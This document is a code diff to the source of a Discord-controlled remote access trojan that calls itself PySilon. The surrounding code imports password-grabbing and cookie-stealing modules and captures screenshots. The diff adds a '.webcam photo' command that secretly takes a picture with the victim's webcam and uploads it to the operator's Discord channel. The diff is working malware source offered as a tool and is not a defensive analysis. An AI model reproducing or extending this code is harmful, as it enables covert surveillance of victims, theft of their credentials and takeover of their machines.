@@ -13,6 +13,7 @@ from psutil import process_iter
 import time
 from getpass import getuser
 import pyaudio
+from cv2 import VideoCapture, imwrite, CAP_DSHOW
 import subprocess
 from zipfile import ZipFile
 import asyncio
@@ -26,7 +27,6 @@ import pyautogui
 from resources.misc import *
 from resources.passwords_grabber import *
 from resources.get_cookies import *
-
 ###############################################################################
 ##                                                                           ##
 ##   DISCLAIMER !!! READ BEFORE USING                                        ##
@@ -311,6 +311,7 @@ async def on_message(message):
     global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages
     if message.author != client.user:
         if message.channel.id in channel_ids.values():
+
             if message.content == '.ss':
                 await message.delete()
                 ImageGrab.grab(all_screens=True).save('ss.png')
@@ -617,6 +618,19 @@ async def on_message(message):
                 await message.channel.send('``` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` ```\n\n```Send here PySilon.key generated along with RAT executable```\n\n')
                 expectation = 'key'
 
+            elif message.content[:7] == '.webcam':
+                await message.delete()
+                if message.content.strip() == '.webcam':
+                    reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```'); await reaction_msg.add_reaction('🔴')
+                else:
+                    if message.content[8:] == 'photo':
+                        webcam = VideoCapture(0, CAP_DSHOW)
+                        result, image = webcam.read()
+                        imwrite('webcam.png', image)
+                        reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'), file=discord.File('webcam.png')); await reaction_msg.add_reaction('📌')
+                        os.system('del webcam.png')
+                    else:
+                        reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```'); await reaction_msg.add_reaction('🔴')
 
             elif expectation == 'key':
                 try:
